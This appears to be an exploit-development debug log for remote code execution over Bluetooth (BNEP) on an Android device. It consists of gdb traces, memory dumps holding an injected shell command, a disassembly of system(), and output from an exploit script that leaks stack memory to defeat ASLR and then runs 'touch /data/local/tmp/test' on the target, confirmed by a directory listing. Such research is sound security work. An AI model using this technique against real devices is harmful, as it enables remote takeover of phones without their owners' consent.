0xb6f2920c in sigaction ()
(gdb) 
0xb6f2920e in sigaction ()
(gdb) 
0xb6f29210 in sigaction ()
(gdb) 
0xb6f29212 in sigaction ()
(gdb) 
0xb6f29214 in sigaction ()
(gdb) 
0xb6f29216 in sigaction ()
(gdb) 
0xb6f29218 in sigaction ()
(gdb) 
0xb6f2921a in sigaction ()
(gdb) 
0xb6f2921c in sigaction ()
(gdb) 
0xb6f2921e in sigaction ()
(gdb) 
0xb6f29220 in sigaction ()
(gdb) 
0xb6f29222 in sigaction ()
(gdb) 
0xb6f29224 in sigaction ()
(gdb) 
0xb6f29228 in sigaction ()
(gdb) 
0xb6f2922a in sigaction ()
(gdb) 
0xb6f2922e in sigaction ()
(gdb) 
0xb6f29230 in sigaction ()
(gdb) 
0xb6f29258 in sigaction ()
(gdb) 
0xb6f2925a in sigaction ()
(gdb) 
0xb6f2925c in sigaction ()
(gdb) 
0xb6f2925e in sigaction ()
(gdb) 
0xb6f2926c in sigaction ()
(gdb) 
0xb6f2926e in sigaction ()
(gdb) 
0xb6f29270 in sigaction ()
(gdb) 
0xb6f29272 in sigaction ()
(gdb) 
0xb6f29274 in sigaction ()
(gdb) 
0xb6f29276 in sigaction ()
(gdb) 
0xb6f29278 in sigaction ()
(gdb) 
0xb6f2927a in sigaction ()
(gdb) 
0xb6f2927c in sigaction ()
(gdb) 
0xb6f2927e in sigaction ()
(gdb) 
0xb6f29280 in sigaction ()
(gdb) 
0xb6f29282 in sigaction ()
(gdb) 
0xb6f29286 in sigaction ()
(gdb) 
0xb51edd70 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd72 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd74 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd76 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd78 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd7c in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd7e in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd80 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd82 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd84 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd86 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd88 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd8a in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd8c in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd90 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd92 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd96 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd9a in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edd9e in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edda0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edda2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edda6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edda8 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddac in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddae in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddb2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddb4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddb6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddba in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddbc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddbe in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddc0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddc4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddc6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51e532c in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e5330 in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e5334 in __sigaction@plt () from target:/system/lib/libc.so
(gdb) 
0xb5219504 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5219508 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb521950c in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5219510 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5219514 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb5219518 in __sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddca in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddcc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddce in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd0 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd2 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd4 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd6 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddd8 in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51edddc in sigaction () from target:/system/lib/libc.so
(gdb) 
0xb51eddde in sigaction () from target:/system/lib/libc.so
(gdb) 

0xb5216bea in system () from target:/system/lib/libc.so
(gdb) 

[New LWP 17610]
0xb5216bec in system () from target:/system/lib/libc.so
(gdb) 

0xb5216bee in system () from target:/system/lib/libc.so
(gdb) 

0xb5216bf4 in system () from target:/system/lib/libc.so
(gdb) 

0xb5216c08 in system () from target:/system/lib/libc.so
(gdb) 

0xb5216c0a in system () from target:/system/lib/libc.so
(gdb) 
0xb5216c0c in system () from target:/system/lib/libc.so
(gdb) 
0xb5216c0e in system () from target:/system/lib/libc.so
(gdb) 
0xb5216c10 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216c12 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216c14 in system () from target:/system/lib/libc.so
(gdb) 
[New LWP 17618]
0xb5216c16 in system () from target:/system/lib/libc.so
(gdb) 
0xb5216c18 in system () from target:/system/lib/libc.so
(gdb) 
btu_check_bt_sleep () at system/bt/stack/./btu/btu_task.c:234
234	system/bt/stack/./btu/btu_task.c: No such file or directory.
(gdb) 
0xacf441fe	234	in system/bt/stack/./btu/btu_task.c
(gdb) 
0xacf44200	234	in system/bt/stack/./btu/btu_task.c
(gdb) 
0xacf44214	234	in system/bt/stack/./btu/btu_task.c
(gdb) 
0xacf44216	234	in system/bt/stack/./btu/btu_task.c
(gdb) 
0xacf4421a	234	in system/bt/stack/./btu/btu_task.c
(gdb) 
0xacf4421c	234	in system/bt/stack/./btu/btu_task.c
(gdb) 
0xacf4421e	234	in system/bt/stack/./btu/btu_task.c
(gdb) 
btu_hci_msg_ready (queue=<optimized out>, context=<optimized out>)
    at system/bt/stack/./btu/btu_task.c:110
110	in system/bt/stack/./btu/btu_task.c
(gdb) 
0xacf44222	110	in system/bt/stack/./btu/btu_task.c
(gdb) 
run_reactor (reactor=<optimized out>, iterations=<optimized out>)
    at system/bt/osi/./src/reactor.c:273
273	system/bt/osi/./src/reactor.c: No such file or directory.
(gdb) 
0xacf58f88	273	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58f8a	273	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58f8e	273	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58f92	273	in system/bt/osi/./src/reactor.c
(gdb) 
275	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58f9e	275	in system/bt/osi/./src/reactor.c
(gdb) 
0xace64c10 in pthread_mutex_unlock@plt ()
   from target:/system/lib/hw/bluetooth.default.so
(gdb) 
0xace64c14 in pthread_mutex_unlock@plt ()
   from target:/system/lib/hw/bluetooth.default.so
(gdb) 
0xace64c18 in pthread_mutex_unlock@plt ()
   from target:/system/lib/hw/bluetooth.default.so
(gdb) 
0xb521851c in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218520 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218522 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218524 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218526 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 

0xb5218528 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb521852c in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218530 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218532 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218536 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb521853a in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218542 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218544 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218546 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218548 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb521854a in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb521854c in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb52185d2 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb52185d4 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 

0xb52185d6 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
run_reactor (reactor=<optimized out>, iterations=<optimized out>)
    at system/bt/osi/./src/reactor.c:277
277	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58fa6	277	in system/bt/osi/./src/reactor.c
(gdb) 
247	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58fb8	247	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58fbc	247	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58fbe	247	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58fc0	247	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58fc4	247	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58fc8	247	in system/bt/osi/./src/reactor.c
(gdb) 
234	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58fce	234	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58fd0	234	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58eea	235	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58eec	235	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58ef0	235	in system/bt/osi/./src/reactor.c
(gdb) 
0xace64bec in pthread_mutex_lock@plt ()
   from target:/system/lib/hw/bluetooth.default.so
(gdb) 
0xace64bf0 in pthread_mutex_lock@plt ()
   from target:/system/lib/hw/bluetooth.default.so
(gdb) 
0xace64bf4 in pthread_mutex_lock@plt ()
   from target:/system/lib/hw/bluetooth.default.so
(gdb) 
0xb5218274 in pthread_mutex_lock () from target:/system/lib/libc.so
(gdb) 
0xb5218276 in pthread_mutex_lock () from target:/system/lib/libc.so
(gdb) 
0xb5218278 in pthread_mutex_lock () from target:/system/lib/libc.so
(gdb) 
0xb521827c in pthread_mutex_lock () from target:/system/lib/libc.so
(gdb) 
0xb521827e in pthread_mutex_lock () from target:/system/lib/libc.so
(gdb) 
0xb5218280 in pthread_mutex_lock () from target:/system/lib/libc.so
(gdb) 
0xb5218284 in pthread_mutex_lock () from target:/system/lib/libc.so
(gdb) 
0xb5218288 in pthread_mutex_lock () from target:/system/lib/libc.so
(gdb) 
0xb521828a in pthread_mutex_lock () from target:/system/lib/libc.so
(gdb) 
0xb5218296 in pthread_mutex_lock () from target:/system/lib/libc.so
(gdb) 
0xb5218298 in pthread_mutex_lock () from target:/system/lib/libc.so
(gdb) 


0xb521829a in pthread_mutex_lock () from target:/system/lib/libc.so
(gdb) 

0xb521829c in pthread_mutex_lock () from target:/system/lib/libc.so
(gdb) 

0xb52182a0 in pthread_mutex_lock () from target:/system/lib/libc.so
(gdb) 

run_reactor (reactor=<optimized out>, iterations=<optimized out>)
    at system/bt/osi/./src/reactor.c:236
236	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58ef8	236	in system/bt/osi/./src/reactor.c
(gdb) 

list_clear (list=0xa7c0f790) at system/bt/osi/./src/list.c:169
169	system/bt/osi/./src/list.c: No such file or directory.
(gdb) 

0xacf586aa	169	in system/bt/osi/./src/list.c
(gdb) 

170	in system/bt/osi/./src/list.c
(gdb) 

171	in system/bt/osi/./src/list.c
(gdb) 

0xacf586b0	171	in system/bt/osi/./src/list.c
(gdb) 

0xacf586d4	237	in system/bt/osi/./src/list.c
(gdb) 

173	in system/bt/osi/./src/list.c
(gdb) 
175	in system/bt/osi/./src/list.c
(gdb) 
176	in system/bt/osi/./src/list.c
(gdb) 
run_reactor (reactor=<optimized out>, iterations=<optimized out>)
    at system/bt/osi/./src/reactor.c:237
237	system/bt/osi/./src/reactor.c: No such file or directory.
(gdb) 
0xacf58efe	237	in system/bt/osi/./src/reactor.c
(gdb) 
0xace64c10 in pthread_mutex_unlock@plt ()
   from target:/system/lib/hw/bluetooth.default.so
(gdb) 
0xace64c14 in pthread_mutex_unlock@plt ()
   from target:/system/lib/hw/bluetooth.default.so
(gdb) 
0xace64c18 in pthread_mutex_unlock@plt ()
   from target:/system/lib/hw/bluetooth.default.so
(gdb) 
0xb521851c in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218520 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218522 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218524 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218526 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218528 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb521852c in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218530 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218532 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218536 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb521853a in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218542 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218544 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218546 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb5218548 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb521854a in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb521854c in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb52185d2 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb52185d4 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
0xb52185d6 in pthread_mutex_unlock () from target:/system/lib/libc.so
(gdb) 
run_reactor (reactor=<optimized out>, iterations=<optimized out>)
    at system/bt/osi/./src/reactor.c:240
240	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58f06	240	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58f08	240	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58f0a	240	in system/bt/osi/./src/reactor.c
(gdb) 
0xacf58f0e	240	in system/bt/osi/./src/reactor.c
(gdb) 
0xace65528 in epoll_wait@plt ()
   from target:/system/lib/hw/bluetooth.default.so
(gdb) 
0xace6552c in epoll_wait@plt ()
   from target:/system/lib/hw/bluetooth.default.so
(gdb) 
0xace65530 in epoll_wait@plt ()
   from target:/system/lib/hw/bluetooth.default.so
(gdb) 
0xb51ea150 in epoll_wait () from target:/system/lib/libc.so
(gdb) 
0xb51ea152 in epoll_wait () from target:/system/lib/libc.so
(gdb) 
0xb51ea154 in epoll_wait () from target:/system/lib/libc.so
(gdb) 
0xb51ea158 in epoll_wait () from target:/system/lib/libc.so
(gdb) 
0xb51ea15c in epoll_wait () from target:/system/lib/libc.so
(gdb) 
0xb51e4cc0 in epoll_pwait@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e4cc4 in epoll_pwait@plt () from target:/system/lib/libc.so
(gdb) 
0xb51e4cc8 in epoll_pwait@plt () from target:/system/lib/libc.so
(gdb) 
0xb51ea0f0 in epoll_pwait () from target:/system/lib/libc.so
(gdb) 
0xb51ea0f2 in epoll_pwait () from target:/system/lib/libc.so
(gdb) 
0xb51ea0f4 in epoll_pwait () from target:/system/lib/libc.so
(gdb) 
0xb51ea0f8 in epoll_pwait () from target:/system/lib/libc.so
(gdb) 
0xb51ea0fc in epoll_pwait () from target:/system/lib/libc.so
(gdb) 
0xb51ea0fe in epoll_pwait () from target:/system/lib/libc.so
(gdb) 
0xb51ea102 in epoll_pwait () from target:/system/lib/libc.so
(gdb) 
0xb51ea106 in epoll_pwait () from target:/system/lib/libc.so
(gdb) 
0xb51ea10a in epoll_pwait () from target:/system/lib/libc.so
(gdb) 
0xb51ea10e in epoll_pwait () from target:/system/lib/libc.so
(gdb) 
0xb51ea112 in epoll_pwait () from target:/system/lib/libc.so
(gdb) 

Thread 25 "btif_sock" received signal SIGSEGV, Segmentation fault.
[Switching to LWP 15544]
0xb51e9c8a in clock () from target:/system/lib/libc.so
(gdb) 

Thread 30 "BluetoothAvrcpH" received signal SIGSEGV, Segmentation fault.
[Switching to LWP 15549]
0xb51e9c8a in clock () from target:/system/lib/libc.so
(gdb) 















^C^C
^C
Thread 23 "bt_workqueue" received signal SIGSEGV, Segmentation fault.
[Switching to LWP 15540]
0xacf58852 in list_front (list=<optimized out>)
    at system/bt/osi/./src/list.c:72
72	system/bt/osi/./src/list.c: No such file or directory.
(gdb) x/10s  0xad08160c
0xad08160c <btm_cb+288>:	"\"\027\252\252AAAAMk!\265\";\ntouch /data/local/tmp/test\n#"
0xad081638 <btm_cb+332>:	""
0xad081639 <btm_cb+333>:	""
0xad08163a <btm_cb+334>:	""
0xad08163b <btm_cb+335>:	""
0xad08163c <btm_cb+336>:	""
0xad08163d <btm_cb+337>:	""
0xad08163e <btm_cb+338>:	""
0xad08163f <btm_cb+339>:	""
0xad081640 <btm_cb+340>:	""
(gdb) x/10x  0xad08160c
0xad08160c <btm_cb+288>:	0x22	0x17	0xaa	0xaa	0x41	0x41	0x41	0x41
0xad081614 <btm_cb+296>:	0x4d	0x6b
(gdb) x/20x  0xad08160c
0xad08160c <btm_cb+288>:	0x22	0x17	0xaa	0xaa	0x41	0x41	0x41	0x41
0xad081614 <btm_cb+296>:	0x4d	0x6b	0x21	0xb5	0x22	0x3b	0x0a	0x74
0xad08161c <btm_cb+304>:	0x6f	0x75	0x63	0x68
(gdb) x/30x  0xad08160c
0xad08160c <btm_cb+288>:	0x22	0x17	0xaa	0xaa	0x41	0x41	0x41	0x41
0xad081614 <btm_cb+296>:	0x4d	0x6b	0x21	0xb5	0x22	0x3b	0x0a	0x74
0xad08161c <btm_cb+304>:	0x6f	0x75	0x63	0x68	0x20	0x2f	0x64	0x61
0xad081624 <btm_cb+312>:	0x74	0x61	0x2f	0x6c	0x6f	0x63
(gdb) disass 0xb5216b4d
Dump of assembler code for function system:
   0xb5216b4c <+0>:	push	{r4, r5, r6, lr}
   0xb5216b4e <+2>:	sub	sp, #72	; 0x48
   0xb5216b50 <+4>:	ldr	r1, [pc, #236]	; (0xb5216c40 <system+244>)
   0xb5216b52 <+6>:	cmp	r0, #0
   0xb5216b54 <+8>:	ldr	r2, [pc, #236]	; (0xb5216c44 <system+248>)
   0xb5216b56 <+10>:	add	r1, pc
   0xb5216b58 <+12>:	ldr	r1, [r1, #0]
   0xb5216b5a <+14>:	add	r2, pc
   0xb5216b5c <+16>:	vld1.64	{d16-d17}, [r2]
   0xb5216b60 <+20>:	ldr	r1, [r1, #0]
   0xb5216b62 <+22>:	str	r1, [sp, #68]	; 0x44
   0xb5216b64 <+24>:	add	r1, sp, #48	; 0x30
   0xb5216b66 <+26>:	vst1.64	{d16-d17}, [r1]
   0xb5216b6a <+30>:	beq.n	0xb5216bf6 <system+170>
   0xb5216b6c <+32>:	add	r4, sp, #12
   0xb5216b6e <+34>:	str	r0, [sp, #56]	; 0x38
   0xb5216b70 <+36>:	mov	r0, r4
   0xb5216b72 <+38>:	blx	0xb51e4a38 <sigemptyset@plt>
   0xb5216b76 <+42>:	mov	r0, r4
   0xb5216b78 <+44>:	movs	r1, #17
   0xb5216b7a <+46>:	blx	0xb51e511c <sigaddset@plt>
   0xb5216b7e <+50>:	add	r2, sp, #8
---Type <return> to continue, or q <return> to quit---
   0xb5216b80 <+52>:	movs	r0, #0
   0xb5216b82 <+54>:	mov	r1, r4
   0xb5216b84 <+56>:	blx	0xb51e45ac <sigprocmask@plt>
   0xb5216b88 <+60>:	blx	0xb51e5a70 <vfork@plt>
   0xb5216b8c <+64>:	mov	r4, r0
   0xb5216b8e <+66>:	cmp.w	r4, #4294967295
   0xb5216b92 <+70>:	beq.n	0xb5216bfa <system+174>
   0xb5216b94 <+72>:	cmp	r4, #0
   0xb5216b96 <+74>:	beq.n	0xb5216c1e <system+210>
   0xb5216b98 <+76>:	add	r2, sp, #32
   0xb5216b9a <+78>:	movs	r0, #2
   0xb5216b9c <+80>:	movs	r1, #0
   0xb5216b9e <+82>:	blx	0xb51e4a44 <sigaction@plt>
   0xb5216ba2 <+86>:	add	r2, sp, #16
   0xb5216ba4 <+88>:	movs	r0, #3
   0xb5216ba6 <+90>:	movs	r1, #0
   0xb5216ba8 <+92>:	blx	0xb51e4a44 <sigaction@plt>
   0xb5216bac <+96>:	add	r5, sp, #4
   0xb5216bae <+98>:	movs	r6, #0
   0xb5216bb0 <+100>:	mov	r0, r4
   0xb5216bb2 <+102>:	mov	r1, r5
   0xb5216bb4 <+104>:	movs	r2, #0
   0xb5216bb6 <+106>:	blx	0xb51e5aa0 <waitpid@plt>
---Type <return> to continue, or q <return> to quit---
   0xb5216bba <+110>:	cmp.w	r0, #4294967295
   0xb5216bbe <+114>:	bne.n	0xb5216bcc <system+128>
   0xb5216bc0 <+116>:	blx	0xb51e451c <__errno@plt>
   0xb5216bc4 <+120>:	ldr	r0, [r0, #0]
   0xb5216bc6 <+122>:	cmp	r0, #4
   0xb5216bc8 <+124>:	beq.n	0xb5216bb0 <system+100>
   0xb5216bca <+126>:	movs	r6, #1
   0xb5216bcc <+128>:	add	r1, sp, #8
   0xb5216bce <+130>:	movs	r0, #2
   0xb5216bd0 <+132>:	movs	r2, #0
   0xb5216bd2 <+134>:	blx	0xb51e45ac <sigprocmask@plt>
   0xb5216bd6 <+138>:	add	r1, sp, #32
   0xb5216bd8 <+140>:	movs	r0, #2
   0xb5216bda <+142>:	movs	r2, #0
   0xb5216bdc <+144>:	blx	0xb51e4a44 <sigaction@plt>
   0xb5216be0 <+148>:	add	r1, sp, #16
   0xb5216be2 <+150>:	movs	r0, #3
   0xb5216be4 <+152>:	movs	r2, #0
   0xb5216be6 <+154>:	blx	0xb51e4a44 <sigaction@plt>
   0xb5216bea <+158>:	ldr	r0, [sp, #4]
   0xb5216bec <+160>:	cmp	r6, #0
   0xb5216bee <+162>:	it	ne
   0xb5216bf0 <+164>:	movne.w	r0, #4294967295
---Type <return> to continue, or q <return> to quit---
   0xb5216bf4 <+168>:	b.n	0xb5216c08 <system+188>
   0xb5216bf6 <+170>:	movs	r0, #1
   0xb5216bf8 <+172>:	b.n	0xb5216c08 <system+188>
   0xb5216bfa <+174>:	add	r1, sp, #8
   0xb5216bfc <+176>:	movs	r0, #2
   0xb5216bfe <+178>:	movs	r2, #0
   0xb5216c00 <+180>:	blx	0xb51e45ac <sigprocmask@plt>
   0xb5216c04 <+184>:	mov.w	r0, #4294967295
   0xb5216c08 <+188>:	ldr	r1, [pc, #68]	; (0xb5216c50 <system+260>)
   0xb5216c0a <+190>:	ldr	r2, [sp, #68]	; 0x44
   0xb5216c0c <+192>:	add	r1, pc
   0xb5216c0e <+194>:	ldr	r1, [r1, #0]
   0xb5216c10 <+196>:	ldr	r1, [r1, #0]
   0xb5216c12 <+198>:	subs	r1, r1, r2
   0xb5216c14 <+200>:	itt	eq
   0xb5216c16 <+202>:	addeq	sp, #72	; 0x48
   0xb5216c18 <+204>:	popeq	{r4, r5, r6, pc}
   0xb5216c1a <+206>:	blx	0xb51e44f8 <__stack_chk_fail@plt>
   0xb5216c1e <+210>:	add	r1, sp, #8
   0xb5216c20 <+212>:	movs	r0, #2
   0xb5216c22 <+214>:	movs	r2, #0
   0xb5216c24 <+216>:	blx	0xb51e45ac <sigprocmask@plt>
   0xb5216c28 <+220>:	ldr	r0, [pc, #28]	; (0xb5216c48 <system+252>)
---Type <return> to continue, or q <return> to quit---
   0xb5216c2a <+222>:	add	r1, sp, #48	; 0x30
   0xb5216c2c <+224>:	add	r0, pc
   0xb5216c2e <+226>:	ldr	r0, [r0, #0]
   0xb5216c30 <+228>:	ldr	r2, [r0, #0]
   0xb5216c32 <+230>:	ldr	r0, [pc, #24]	; (0xb5216c4c <system+256>)
   0xb5216c34 <+232>:	add	r0, pc
   0xb5216c36 <+234>:	blx	0xb51e5b90 <execve@plt>
   0xb5216c3a <+238>:	movs	r0, #127	; 0x7f
   0xb5216c3c <+240>:	blx	0xb51e4a50 <_exit@plt>
   0xb5216c40 <+244>:	strdeq	lr, [r3], -r10
   0xb5216c44 <+248>:	andeq	sp, r3, r2, lsr #17
   0xb5216c48 <+252>:	andeq	lr, r3, r0, asr #16
   0xb5216c4c <+256>:	andeq	pc, r2, r4, lsl #6
   0xb5216c50 <+260>:	andeq	lr, r3, r4, asr #16
End of assembler dump.
(gdb) 
```

Execution:

```asm
python exp4.py hci0 84:55:A5:B6:6F:F6
[*] Pwn attempt 0:
[*] Set hci0 to new rand BDADDR 16:e1:66:a7:8a:3d
[↘] Doing stack memeory leak...
00: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 
01: 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 
02: 00000000 00000000 00000000 ad0911c4 9a2ed2c8 00000018 00000044 acf3de5d acf4d67d 
03: acf475e1 ad0911c4 a7c61ac0 16e166a7 00008a3d 00000000 b4300500 b4300970 1187a437 
04: 00000000 9a2ed2a8 000003f3 00020001 9a2e0700 acfac80a b2f1fee0 ad08fb74 b5215a97 
05: b4300500 b4300970 b2f1d220 00000000 00000001 b5225001 1187a437 00000000 00000000 
06: a7c38bc0 aa5753c0 aa5753c8 b2f79360 00000008 00000000 b5233a89 00000001 00000000 
07: 00000000 00000000 ad08fb74 acf61330 1187a437 00000008 a7c38bc0 b2f79360 acfc9968 
08: b2f79360 00000000 a7c0f0e8 a7c38bc0 b2f79360 acfc9968 acf588f7 00000000 a7c38bc0 
09: a7c00000 b4300500 00000003 a7c63b60 a7c00000 b4300500 b4300a78 aa5753c8 a7c63b60 
10: ad0911c4 ad08fb74 b5225d3b 00000063 aa5753c8 b4300500 00000000 aa5753c8 b5225d67 
11: acf3e0f5 ad07a770 00000000 a7c63b60 00000013 b5235ad5 00000063 a7c63b60 b4300500 
12: b4300970 b2f1d418 00000000 00000001 b5225001 1187a437 a7c63b60 00000044 00000013 
13: 00000000 00000044 a7c63b60 ad0911c4 ad08fb74 acf3df91 00000040 a7c63b70 00000000 
14: acf472db a7c0fa24 b5225d3b 0000001d aa5753c8 b4300500 00000000 aa5753c8 b5225d67 
15: 9a2ed4b0 a7c0f778 0000000f b2f1d298 00000000 b5235ad5 0000001d b2f1d298 aa5753c8 
16: 00000000 9a2ed8d8 00000000 9a2ed4b0 b5235d03 00000000 9a2ed4b0 1187a437 00000008 
17: b2f1d430 1187a437 a7c0f250 b2f1d298 9a2ed8d8 b51ea361 00000001 00000000 a7c0f778 
18: 1187a437 9a2ed8d8 acf59793 1187a437 a7c0f780 00000001 a7c0fa18 9a2ed8d8 00000000 
19: 9a2ed4b0 a7c0f778 a7c0fa24 acf58f85 00000001 0000003e a7c0fa18 00000000 00000005 
[*] LIBC  0xb51ea361
[*] BT    0xacf4d67d
[*] libc_base: 0xb5142000, bss_base: 0xacece000
[*] system: 0xb5216b4d, acl_name: 0xad08160c
[*] Set hci0 to new rand BDADDR e3:83:0c:ab:03:c6
[*] system    0xb5216b4d
[*] PAYLOAD "\x17\xaa\xaaAAAAMk!\xb5";
    touch /data/local/tmp/test
    #
[+] Connecting to BNEP again: Done
[+] Pwning...: Done
[*] Looks like it didn't crash. Possibly worked


```

Payload executed:

```asm

s3ve3g:/ # ls -la /data/local/tmp/                                             
total 24
drwxrwxrwx 2 shell shell 4096 2014-01-13 02:05 .
drwxr-x--x 3 root  root  4096 2014-01-22 00:36 ..
-rw------- 1 root  root  5773 2018-03-25 12:51 apt.conf.owMBvd
-rw------- 1 root  root  1182 2018-03-25 12:51 apt.data.HdUevr
-rw------- 1 root  root   455 2018-03-25 12:51 apt.sig.kv2PHc
-rw------- 1 1002  1002     0 2014-01-13 02:05 test
s3ve3g:/ #
```

More info:

We control R4 via REMOTE_NAME here, starting from 0xacec41be. Disassemble on different execution, so addresses are different, than logs above.


```asm
(gdb) disass
Dump of assembler code for function btu_hci_msg_ready:
   0xacec41b8 <+0>:	push	{r4, lr}
   0xacec41ba <+2>:	bl	0xaced7ecc <fixed_queue_dequeue>
   0xacec41be <+6>:	mov	r4, r0
=> 0xacec41c0 <+8>:	ldrh	r1, [r4, #0]
   0xacec41c2 <+10>:	bic.w	r0, r1, #255	; 0xff
   0xacec41c6 <+14>:	cmp.w	r0, #5632	; 0x1600
   0xacec41ca <+18>:	bge.n	0xacec41e8 <btu_hci_msg_ready+48>
